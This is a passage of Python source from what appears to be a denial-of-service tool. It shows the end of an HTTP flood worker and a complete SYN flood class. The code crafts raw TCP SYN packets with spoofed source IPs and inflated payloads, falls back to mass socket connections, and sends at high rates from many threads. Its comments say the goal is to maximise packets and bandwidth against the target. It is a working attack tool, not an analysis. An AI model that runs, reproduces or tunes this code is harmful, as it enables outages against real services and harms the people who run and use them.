                    sent_bytes += len(str(self.post_data))
                
                # Stream and count response bytes
                if self.method != 'HEAD':
                    for chunk in response.iter_content(chunk_size=self.chunk_size):
                        if not self.running:
                            break
                        sent_bytes += len(chunk)
                
                # Update stats
                self.increment_stat("successful")
                self.increment_stat("packets_sent")
                self.increment_stat("bytes_sent", sent_bytes)
                
            except RequestException as e:
                self.increment_stat("failures")
                if self.debug:
                    self.logger.debug(f"Request failed: {str(e)}")
                time.sleep(0.1)
            except Exception as e:
                if self.debug:
                    self.logger.error(f"Unexpected error: {str(e)}")
                time.sleep(0.1)

    def start(self):
        """Start HTTP flood operation"""
        super().start()
        
        # Import check
        try:
            import requests
        except ImportError:
            UI.print_error("Please install required package: pip install requests")
            return
        
        UI.print_header("HTTP Flood Operation")
        UI.print_info(f"Starting HTTP flood against {len(self.targets)} targets")
        
        # Configuration display
        print(f"\n{Style.BOLD}Configuration:{Style.RESET}")
        print(f"- Method: {self.method}")
        print(f"- Path: {self.path}")
        print(f"- Threads per target: {self.threads}")
        print(f"- Duration: {self.duration} seconds")
        print(f"- Connection pool size: {self.connection_pool_size}")
        
        # Launch worker threads
        total_threads = len(self.targets) * len(self.ports) * self.threads
        UI.print_info(f"Launching {total_threads} HTTP worker threads...")
        
        thread_count = 0
        for target in self.targets:
            for port in self.ports:
                for _ in range(self.threads):
                    thread = threading.Thread(target=self.flood_worker, args=(target, port))
                    thread.daemon = True
                    thread.start()
                    self.thread_list.append(thread)
                    thread_count += 1
                    
                    if thread_count % 10 == 0 or thread_count == total_threads:
                        UI.print_progress_bar(thread_count, total_threads,
                                         prefix=f"Threads: {thread_count}/{total_threads}",
                                         length=30)
        
        # Start performance monitoring
        self._monitor_thread = threading.Thread(target=self.monitor_performance)
        self._monitor_thread.daemon = False
        self._monitor_thread.start()
        
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            UI.print_warning("Operation interrupted by user")
        finally:
            self.stop()


class SYNFlooder(AttackModule):
    def __init__(self, targets: List[str], ports: List[int], duration: int = 60, 
                 threads: int = 5, debug: bool = False, proxy_manager=None, skip_prompt: bool = False):
        super().__init__(targets, ports, skip_prompt)
        self.duration = duration
        self.threads = threads
        self.debug = debug
        self.proxy_manager = proxy_manager
        
        # SYN flood specific settings
        self.socket_count = 2048     # Doubled from 1024
        self.send_rate = 50000       # Increased from 10000
        
        # Performance settings - aggressive values
        self.burst_size = 4096       # Doubled from 2048
        self.burst_delay = 0.0001    # Reduced from 0.001 for faster sending
        
        # IP and TCP header settings
        self.ip_id = random.randint(1000, 65535)
        self.tcp_seq = random.randint(1000, 65535)
        self.tcp_window = 65535  # Maximum window size
        
        # Source IP spoofing (only works with raw sockets)
        self.spoof_ip = True
        self.ip_range = [
            "192.168.0.0/16",
            "10.0.0.0/8",
            "172.16.0.0/12"
        ]
        
        # TCP options to increase packet size (only for raw sockets)
        self.use_tcp_options = True
        self.tcp_option_mss = 1460
        self.tcp_option_wscale = 7
        self.tcp_option_sackperm = True
        self.tcp_option_timestamp = True
        
        # Add payload to SYN packets (only for raw sockets) to increase BPS
        self.add_payload = True
        self.payload_size = 8192     # Doubled from 4096 bytes
        
        # Socket buffer size
        self.socket_buffer = 524288  # Increased to 512KB
        
        # Performance monitoring
        self.perf_data = {
            "last_packets": 0,
            "last_bytes": 0,
            "last_time": time.time(),
            "current_pps": 0,
            "current_mbps": 0,
            "highest_pps": 0,
            "highest_mbps": 0
        }
        
        # Thread management
        self._monitor_thread = None
        self._stop_event = threading.Event()
        
        # Socket pools for better resource management
        self.socket_pools = []
        self.socket_pool_locks = []
        for _ in range(min(threads, 32)):  # Limit to 32 pools max
            self.socket_pools.append({})
            self.socket_pool_locks.append(threading.Lock())
        
        # Precomputed packet templates for better performance
        self.packet_templates = []
        
        if debug:
            self.logger.setLevel(logging.DEBUG)
    
    def _check_raw_socket_capability(self):
        """Check if we can create raw sockets (requires root/admin)"""
        try:
            # Try to create a raw socket
            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
                self.use_raw_socket = True
                return True
        except (socket.error, PermissionError):
            self.use_raw_socket = False
            return False
    
    def _generate_random_ip(self):
        """Generate a random IP address for spoofing"""
        # More sophisticated implementation that respects CIDR ranges
        cidr = random.choice(self.ip_range)
        network, bits = cidr.split('/')
        bits = int(bits)
        
        # Convert network address to integer
        network_int = 0
        for i, octet in enumerate(reversed(network.split('.'))):
            network_int += int(octet) * (256 ** i)
        
        # Calculate the number of hosts in this network
        host_bits = 32 - bits
        host_count = 2 ** host_bits - 2  # Subtract network and broadcast addresses
        
        if host_count <= 0:
            # Fallback for single-host networks
            return network
        
        # Generate a random host in this network
        random_host = random.randint(1, host_count)
        ip_int = network_int + random_host
        
        # Convert back to dotted decimal
        octets = []
        for i in range(4):
            octets.insert(0, str(ip_int % 256))
            ip_int //= 256
        
        return '.'.join(octets)
    
    def _calculate_checksum(self, msg):
        """Calculate the TCP/IP checksum"""
        s = 0
        for i in range(0, len(msg), 2):
            if i + 1 < len(msg):
                w = (msg[i] << 8) + msg[i + 1]
            else:
                w = msg[i] << 8
            s = s + w
        
        s = (s >> 16) + (s & 0xffff)
        s = s + (s >> 16)
        
        # Complement and mask to 2 bytes
        s = ~s & 0xffff
        
        return s
    
    def _create_tcp_options(self):
        """Create TCP options to increase packet size"""
        options = b''
        
        # MSS option (kind=2, len=4, value=1460)
        if self.tcp_option_mss:
            options += struct.pack('!BBH', 2, 4, self.tcp_option_mss)
        
        # Window scale option (kind=3, len=3, value=7)
        if self.tcp_option_wscale:
            options += struct.pack('!BBB', 3, 3, self.tcp_option_wscale)
        
        # SACK permitted option (kind=4, len=2)
        if self.tcp_option_sackperm:
            options += struct.pack('!BB', 4, 2)
        
        # Timestamp option (kind=8, len=10, value=timestamp, echo=0)
        if self.tcp_option_timestamp:
            options += struct.pack('!BBLLB', 8, 10, int(time.time()), 0, 0)
        
        # Add padding if needed to make options a multiple of 4 bytes
        if len(options) % 4 != 0:
            padding_len = 4 - (len(options) % 4)
            options += b'\x00' * padding_len
        
        return options
    
    def _create_syn_packet(self, src_ip, dst_ip, dst_port):
        """Create a TCP SYN packet (raw socket version) with options and payload"""
        # Generate TCP options
        tcp_options = self._create_tcp_options() if self.use_tcp_options else b''
        tcp_options_len = len(tcp_options) // 4  # Length in 32-bit words
        
        # Generate payload if enabled
        payload = b''
        if self.add_payload:
            payload = os.urandom(self.payload_size)
        
        # IP Header
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 20 + 20 + len(tcp_options) + len(payload)  # IP + TCP + options + payload
        ip_id = self.ip_id
        ip_frag_off = 0
        ip_ttl = 64
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(dst_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        # IP header
        ip_header = struct.pack('!BBHHHBBH4s4s',
            ip_ihl_ver,
            ip_tos,
            ip_tot_len,
            ip_id,
            ip_frag_off,
            ip_ttl,
            ip_proto,
            ip_check,
            ip_saddr,
            ip_daddr
        )
        
        # TCP Header
        tcp_source = random.randint(1024, 65535)  # Random source port
        tcp_dest = dst_port
        tcp_seq = self.tcp_seq
        tcp_ack_seq = 0
        tcp_doff = 5 + tcp_options_len  # 5 words (20 bytes) + options
        
        # TCP Flags
        tcp_fin = 0
        tcp_syn = 1
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = self.tcp_window
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
        
        # TCP header without options and checksum
        tcp_header = struct.pack('!HHLLBBHHH',
            tcp_source,
            tcp_dest,
            tcp_seq,
            tcp_ack_seq,
            tcp_offset_res,
            tcp_flags,
            tcp_window,
            tcp_check,
            tcp_urg_ptr
        )
        
        # Combine TCP header with options
        tcp_header_with_options = tcp_header + tcp_options
        
        # Pseudo header for TCP checksum calculation
        source_address = socket.inet_aton(src_ip)
        dest_address = socket.inet_aton(dst_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header_with_options) + len(payload)
        
        psh = struct.pack('!4s4sBBH',
            source_address,
            dest_address,
            placeholder,
            protocol,
            tcp_length
        )
        
        psh = psh + tcp_header_with_options + payload
        
        tcp_check = self._calculate_checksum(psh)
        
        # Make the TCP header again with the correct checksum
        tcp_header = struct.pack('!HHLLBBHHH',
            tcp_source,
            tcp_dest,
            tcp_seq,
            tcp_ack_seq,
            tcp_offset_res,
            tcp_flags,
            tcp_window,
            tcp_check,
            tcp_urg_ptr
        )
        
        # Final packet
        packet = ip_header + tcp_header + tcp_options + payload
        
        # Calculate IP header checksum
        ip_check = self._calculate_checksum(packet[:20])
        
        # Rebuild IP header with correct checksum
        ip_header = struct.pack('!BBHHHBBH4s4s',
            ip_ihl_ver,
            ip_tos,
            ip_tot_len,
            ip_id,
            ip_frag_off,
            ip_ttl,
            ip_proto,
            ip_check,
            ip_saddr,
            ip_daddr
        )
        
        # Final packet with correct IP checksum
        packet = ip_header + tcp_header + tcp_options + payload
        
        return packet
    
    def _precompute_packet_templates(self, target, port):
        """Precompute packet templates for better performance"""
        templates = []
        
        # Generate 10 different packet templates
        for _ in range(10):
            src_ip = self._generate_random_ip()
            packet = self._create_syn_packet(src_ip, target, port)
            templates.append(packet)
        
        return templates
    
    def _send_syn_raw(self, target, port, sock, packet_templates=None):
        """Send SYN packet using raw socket with IP spoofing"""
        try:
            # Use precomputed template if available, otherwise generate new packet
            if packet_templates and random.random() < 0.8:  # 80% chance to use template
                packet = random.choice(packet_templates)
            else:
                # Generate a random source IP for spoofing
                src_ip = self._generate_random_ip()
                packet = self._create_syn_packet(src_ip, target, port)
            
            # Send the packet
            sock.sendto(packet, (target, 0))
            
            # Update stats
            self.increment_stat("packets_sent")
            self.increment_stat("bytes_sent", len(packet))
            self.increment_stat("successful")
            
            return True
        except Exception as e:
            if self.debug:
                self.logger.debug(f"Raw socket send error: {e}")
            self.increment_stat("failures")
            return False
    
    def _send_syn_normal(self, target, port, sock):
        """Send SYN packet using normal socket (non-raw) with enhanced payload"""
        try:
            sock.settimeout(0.005)  # Further reduced timeout
            
            # Try to connect
            sock.connect((target, port))
            
            # If we get here, the connection was established
            # Send some data to increase BPS before closing
            try:
                # Increased data size significantly
                data_size = random.randint(8192, 32768)  # Increased from 4096-16384
                sock.send(os.urandom(data_size))
                
                # Update stats with the actual data sent
                self.increment_stat("bytes_sent", data_size + 40)  # Data + TCP/IP headers
            except:
                # If send fails, still count the SYN packet
                self.increment_stat("bytes_sent", 40)  # TCP/IP headers only
            
            # Update stats
            self.increment_stat("packets_sent")
            self.increment_stat("successful")
            
            return True
        except (socket.timeout, ConnectionRefusedError):
            # These are actually "successful" for SYN flood - we don't want to complete the connection
            self.increment_stat("packets_sent")
            self.increment_stat("bytes_sent", 40)  # TCP/IP headers only
            self.increment_stat("successful")
            return True
        except Exception as e:
            if self.debug:
                self.logger.debug(f"Normal socket send error: {e}")
            self.increment_stat("failures")
            return False
    
    def _get_socket_from_pool(self, target, port, pool_index=0):
        """Get or create a socket from the specified pool"""
        key = f"{target}:{port}"
        
        with self.socket_pool_locks[pool_index % len(self.socket_pool_locks)]:
            pool = self.socket_pools[pool_index % len(self.socket_pools)]
            
            if key not in pool:
                try:
                    # Create a new socket
                    if self.use_raw_socket:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 524288)  # Increased to 512KB
                        sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)  # Added TCP_NODELAY
                        sock.setblocking(False)
                    else:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 524288)
                        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                        sock.setblocking(0)
                    
                    pool[key] = sock
                except Exception as e:
                    if self.debug:
                        self.logger.debug(f"Socket creation error: {e}")
                    return None
            
            return pool[key]
    
    def flood_target(self, target, port, thread_id=0):
        """Worker function for SYN flooding with enhanced performance"""
        self.logger.debug(f"Starting SYN flood worker {thread_id} for {target}:{port}")
        
        # Socket management
        raw_sock = None
        sockets = []
        packet_templates = None
        
        # Check if we can use raw sockets
        if self.use_raw_socket:
            # Create a raw socket
            try:
                raw_sock = self._get_socket_from_pool(target, port, thread_id)
                if not raw_sock:
                    raise Exception("Failed to get raw socket from pool")
                
                # Precompute packet templates for this worker
                packet_templates = self._precompute_packet_templates(target, port)
                
                self.logger.debug(f"Worker {thread_id} using raw socket for SYN flooding")
            except Exception as e:
                self.logger.warning(f"Worker {thread_id} failed to create raw socket: {e}")
                self.use_raw_socket = False
        
        # If raw socket failed or not available, use normal sockets
        if not self.use_raw_socket:
            # Create socket pool for this worker
            for i in range(self.socket_count):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setblocking(0)  # Non-blocking
                    sockets.append(s)
                except Exception as e:
                    if self.debug:
                        self.logger.debug(f"Socket creation error: {e}")
        
        # Main attack loop
        last_update = time.time()
        packets_sent = 0
        socket_index = 0
        
        try:
            while self.running and not self._stop_event.is_set():
                # Send packets in bursts for better performance
                burst_start = time.time()
                packets_in_burst = 0
                
                for _ in range(self.burst_size):
                    if not self.running or self._stop_event.is_set():
                        break
                    
                    if self.use_raw_socket and raw_sock:
                        # Send using raw socket with IP spoofing
                        success = self._send_syn_raw(target, port, raw_sock, packet_templates)
                    else:
                        # Rotate through normal sockets
                        if not sockets:
                            break
                        
                        # Get next socket
                        s = sockets[socket_index]
                        socket_index = (socket_index + 1) % len(sockets)
                        
                        # Send using normal socket
                        success = self._send_syn_normal(target, port, s)
                        
                        # Replace socket if it was used
                        try:
                            s.close()
                            sockets[socket_index] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sockets[socket_index].setblocking(0)
                        except:
                            pass
                    
                    if success:
                        packets_sent += 1
                        packets_in_burst += 1
                    
                    # Check if we should stop after each packet
                    if not self.running or self._stop_event.is_set():
                        break
                
                # Check if we should stop after the burst
                if not self.running or self._stop_event.is_set():
                    break
                
                # Control send rate with adaptive timing
                burst_duration = time.time() - burst_start
                if burst_duration < self.burst_delay:
                    time.sleep(self.burst_delay)  # Single short sleep instead of intervals
                
                # Increment sequence numbers for variety
                self.tcp_seq = (self.tcp_seq + packets_in_burst) % 65535
                self.ip_id = (self.ip_id + packets_in_burst) % 65535
                
        except Exception as e:
            if self.debug:
                self.logger.error(f"Error in SYN flood worker {thread_id}: {e}")
        finally:
            # Cleanup resources
            if self.use_raw_socket and raw_sock:
                try:
                    raw_sock.close()
                except:
                    pass
            
            for s in sockets:
                try:
                    s.close()
                except:
                    pass
    
    def monitor_performance(self):
        """Monitor and display performance metrics"""
        last_update = time.time()
        last_stats = self.stats
        
        while self.running and not self._stop_event.is_set():
            try:
                time.sleep(0.1)  # More frequent updates for responsiveness
                current_time = time.time()
                elapsed = current_time - last_update
                
                if elapsed >= 1.0:
                    current_stats = self.stats
                    
                    # Calculate rates
                    pps = (current_stats["packets_sent"] - last_stats["packets_sent"]) / elapsed
                    bytes_sent = current_stats["bytes_sent"] - last_stats["bytes_sent"]
                    mbps = (bytes_sent * 8) / (1024 * 1024 * elapsed)
                    
                    # Update peak metrics
                    if pps > self.perf_data["highest_pps"]:
                        self.perf_data["highest_pps"] = pps
                    if mbps > self.perf_data["highest_mbps"]:
                        self.perf_data["highest_mbps"] = mbps
                    
                    # Update current metrics
                    self.perf_data["current_pps"] = pps
                    self.perf_data["current_mbps"] = mbps
                    
                    # Calculate success rate
                    total_attempts = current_stats["successful"] + current_stats["failures"]
                    success_rate = int((current_stats["successful"] / total_attempts * 100) 
                                     if total_attempts > 0 else 0)
                    
                    # Format status line
                    timestamp = time.strftime("%H:%M:%S", time.localtime(current_time))
                    status_line = f"[{timestamp}] | Target: {self.targets[0]} | Port: {self.ports[0]} | Method: SYNFLOODER | PPS: {pps:.2f} | BPS: {mbps:.2f} MB | Success Rate: {success_rate}%"
                    
                    # Print status
                    print(status_line)
                    
                    # Update tracking values
                    last_stats = current_stats
                    last_update = current_time
                    
            except Exception as e:
                if self.debug:
                    self.logger.error(f"Error in performance monitoring: {e}")
                time.sleep(1)
    
    def _print_final_stats(self):
        """Print final statistics"""
        elapsed = time.time() - self.start_time
        pps = self.stats["packets_sent"] / elapsed if elapsed > 0 else 0
        mbps = (self.stats["bytes_sent"] * 8) / (1024 * 1024 * elapsed) if elapsed > 0 else 0
        
        UI.print_header("Operation Summary")
        print(f"- Duration: {elapsed:.2f} seconds")
        print(f"- Total SYN packets sent: {self.stats['packets_sent']:,}")
        print(f"- Total data sent: {self.stats['bytes_sent'] / (1024*1024):.2f} MB")
        print(f"- Failed packets: {self.stats['failures']:,}")
        print(f"- Average speed: {pps:.0f} packets/sec ({mbps:.2f} Mbps)")
        print(f"- Peak performance: {self.perf_data['highest_pps']:.0f} packets/sec ({self.perf_data['highest_mbps']:.2f} Mbps)")
    
    def start(self):
        """Start the SYN flood operation"""
        super().start()
        
        UI.print_header("SYN Flood Operation")
        UI.print_info(f"Starting SYN flood against {len(self.targets)} targets on {len(self.ports)} ports")
        
        # Reset stop event
        self._stop_event.clear()
        
        # Check for raw socket capability
        has_raw = self._check_raw_socket_capability()
        if has_raw:
            UI.print_success("Running with raw socket capability - IP spoofing enabled")
            if self.add_payload:
                UI.print_info(f"Adding {self.payload_size/1024:.1f}KB payload to each SYN packet for higher BPS")
            if self.use_tcp_options:
                UI.print_info("Using TCP options to increase packet size")
        else:
            UI.print_warning("Running without raw socket capability - IP spoofing disabled")
            UI.print_info("For full SYN flood capabilities, run with root/administrator privileges")
        
        # Show configuration
        print(f"\n{Style.BOLD}Configuration:{Style.RESET}")
        print(f"- Threads per target/port: {self.threads}")
        print(f"- Duration: {self.duration} seconds")
        print(f"- Using {'raw' if self.use_raw_socket else 'normal'} sockets")
        print(f"- Burst size: {self.burst_size} packets")
        print(f"- Target send rate: {self.send_rate * self.threads * len(self.targets) * len(self.ports)} packets/sec")
        
        # Start worker threads
        total_threads = len(self.targets) * len(self.ports) * self.threads
        UI.print_info(f"Launching {total_threads} worker threads...")
        
        thread_count = 0
        for target in self.targets:
            for port in self.ports:
                for t in range(self.threads):
                    thread = threading.Thread(
                        target=self.flood_target, 
                        args=(target, port, thread_count)
                    )
                    thread.daemon = True
                    thread.start()
                    self.thread_list.append(thread)
                    thread_count += 1
                    
                    if thread_count % 10 == 0 or thread_count == total_threads:
                        UI.print_progress_bar(thread_count, total_threads,
                                           prefix=f"Threads: {thread_count}/{total_threads}",
                                           length=30)
        
        # Start performance monitoring
        self._monitor_thread = threading.Thread(target=self.monitor_performance)
        self._monitor_thread.daemon = True
        self._monitor_thread.start()
        
        # Run for specified duration
        try:
            UI.print_info(f"Operation running for {self.duration} seconds (Press Ctrl+C to stop)")
            time.sleep(self.duration)
        except KeyboardInterrupt:
            UI.print_warning("Operation interrupted by user")
        finally:
            # Ensure we stop properly
            self.stop()
    
    def stop(self):
        """Stop the SYN flood operation gracefully and quickly"""
        if not self.running:
            return
            
        UI.print_info("Stopping SYN flood operation...")
        
        # Set the stop event to signal all threads to stop
        self._stop_event.set()
        
        # Set running flag to false
        self.running = False
        
        # Stop the monitor thread first
        if self._monitor_thread and self._monitor_thread.is_alive():
            try:
                self._monitor_thread.join(timeout=1)
            except Exception as e:
                if self.debug:
                    self.logger.debug(f"Error stopping monitor thread: {e}")
        
        # Stop all worker threads with a short timeout
        for thread in self.thread_list:
            try:
                thread.join(timeout=0.5)  # Short timeout for quick termination
            except Exception as e:
                if self.debug:
                    self.logger.debug(f"Error stopping thread: {e}")
        
        # Clean up socket pools
        for pool in self.socket_pools:
            for key, sock in pool.items():
                try:
                    sock.close()
                except:
                    pass
            pool.clear()
        
        # Print final stats
        self._print_final_stats()
        
        UI.print_success("SYN flood operation stopped successfully")